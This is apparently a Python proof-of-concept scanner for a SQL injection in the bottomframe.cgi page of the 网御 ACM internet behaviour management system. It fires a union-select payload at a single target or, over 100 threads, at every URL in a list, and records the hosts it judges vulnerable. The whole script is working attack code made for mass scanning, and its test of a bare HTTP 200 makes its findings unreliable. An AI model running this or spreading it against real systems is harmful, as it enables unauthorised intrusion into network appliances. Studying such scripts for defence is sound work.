# 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞
import requests, argparse, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

            ██╗    ██╗██╗   ██╗     ███████╗ ██████╗ ██╗     
            ██║    ██║╚██╗ ██╔╝     ██╔════╝██╔═══██╗██║     
            ██║ █╗ ██║ ╚████╔╝█████╗███████╗██║   ██║██║     
            ██║███╗██║  ╚██╔╝ ╚════╝╚════██║██║▄▄ ██║██║     
            ╚███╔███╔╝   ██║        ███████║╚██████╔╝███████╗
             ╚══╝╚══╝    ╚═╝        ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                            author:秋妤
                                                            date:2024.10.04
                                                            version:1.0

     """
    print(test)


def poc(target):
    payload = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res1 = requests.get(url=target + payload, timeout=5, verify=False, proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('网御_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(f"{target}" + "\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')


def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()